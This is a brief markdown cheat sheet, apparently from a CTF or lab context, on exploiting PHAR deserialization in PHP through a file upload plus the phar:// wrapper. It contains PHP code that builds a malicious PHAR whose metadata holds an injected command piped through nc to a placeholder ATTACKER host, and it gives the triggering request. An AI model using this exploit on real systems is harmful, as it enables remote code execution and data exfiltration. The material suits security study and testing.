# PHAR Deserialization (PHP)

## Overview

PHAR (PHP Archive) files embed serialized metadata that PHP automatically deserializes when any filesystem function (e.g. `file_exists`, `file_get_contents`) is called with the `phar://` wrapper. In PHP < 8.0, this happens silently — no explicit `unserialize()` call needed. Combining an arbitrary file upload with a path that reaches a filesystem function creates a full deserialization primitive.

## Attack Requirements

1. **Arbitrary file upload** — any extension accepted (or extension validation bypassable)
2. **User-controlled path into a filesystem function** — `file_exists()`, `is_dir()`, `fopen()`, etc.

## Crafting the PHAR

Generate the PHAR locally with the target class as metadata. The class must match the server's namespace exactly.

```php
<?php

namespace App\Helpers;

class UserSettings {
    // ... property definitions and __sleep() matching the target ...
}

$phar = new \Phar("exploit.phar");   // must use \Phar to escape namespace
$phar->startBuffering();
$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings(
    '"; <COMMAND> | nc ATTACKER 9001; #',
    'attacker@htbank.com',
    '$2y$10$<bcrypt_hash>',
    'default.jpg'
));
$phar->stopBuffering();
```

If PHP refuses to write:
```bash
# /etc/php/<version>/cli/php.ini
phar.readonly = Off
```

## Triggering

Upload `exploit.phar` via the file upload (rename `.phar` → `.jpg` if needed). Note the stored path. Then pass `phar://<stored_path>` to the vulnerable endpoint:

```
GET /image?_=phar://uploads/abc123.jpg
```

The server calls `file_exists('phar://uploads/abc123.jpg')` → PHAR metadata deserialized → `__wakeup()` fires → RCE.

## Key Notes

- PHP 8.0+ disabled automatic PHAR metadata deserialization by default — this works on PHP ≤ 7.x
- The file extension doesn't matter; PHP identifies PHARs by their stub (`__HALT_COMPILER()`)
- `curl` times out (exit 28) because `shell_exec` blocks until the piped `nc` finishes — the data is already received
- Use `\Phar` (backslash) when generating inside a namespace, otherwise PHP looks for `<YourNamespace>\Phar`

## Reference

BlackHat 2018: [It's a PHP Unserialization Vulnerability Jim, But Not As We Know It](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
